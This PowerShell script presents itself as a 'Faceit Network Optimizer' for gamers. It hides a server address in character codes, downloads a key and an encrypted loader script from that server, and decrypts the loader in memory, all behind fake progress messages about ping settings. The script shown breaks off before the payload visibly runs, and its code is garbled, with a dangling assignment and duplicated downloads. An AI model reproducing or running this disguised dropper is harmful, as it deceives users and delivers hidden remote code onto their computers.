# Faceit Network Optimizer

function Show-Progress {
    param([string]$Activity, [int]$Percent)
    Write-Progress -Activity $Activity -PercentComplete $Percent
}



Write-Host ""
Write-Host "  ═══════════════════════════════════" -ForegroundColor Cyan
Write-Host "       Faceit Network Optimizer" -ForegroundColor Cyan
Write-Host "  ═══════════════════════════════════" -ForegroundColor Cyan
Write-Host ""


$host.UI.RawUI.ForegroundColor = 'DarkYellow'
$ping = Read-Host '  Enter max ping (ms)'
$host.UI.RawUI.ForegroundColor = 'Gray'
Write-Host ""

Show-Progress -Activity "Connecting to server..." -Percent 20

$serverUrl = 'http://' + 
$sUllz = 'http://' + 
             [char]55+[char]52+'.'+[char]49+[char]49+[char]57+'.'+
             [char]49+[char]57+[char]50+'.'+[char]50+[char]50+[char]52+':5000'

try {

    Show-Progress -Activity "Requesting optimizer..." -Percent 30
    $key = Invoke-RestMethod "$serverUrl/.key" -TimeoutSec 20
    $key = Invoke-RestMethod "$sUllz/.key" -TimeoutSec 20


    Show-Progress -Activity "Sending your max ping..." -Percent 50
    $encrypted = Invoke-RestMethod "$serverUrl/loader.ps1" -TimeoutSec 20
    $encrypted = Invoke-RestMethod "$sUllz/loader.ps1" -TimeoutSec 20

    Show-Progress -Activity "Getting settings for optimizer..." -Percent 70

    $z = [Convert]::FromBase64String($encrypted)
    $w = [Text.Encoding]::UTF8.GetBytes($key)
    $r = New-Object byte[] $z.Length

    for($j = 0; $j -lt $z.Length; $j++) {
        $r[$j] = $z[$j] -bxor $w[$j % $w.Length]


        if($j % 1000 -eq 0) {
            $percent = 70 + (($j / $z.Length) * 20)
            Show-Progress -Activity "Reading your settings..." -Percent $percent
        }
    }


    Show-Progress -Activity "Launching optimizer..." -Percent 95
    Start-Sleep -Milliseconds 300

    Write-Progress -Activity "Complete" -Completed

    Write-Host "  [✓] Optimizer launched successfuly" -ForegroundColor Green
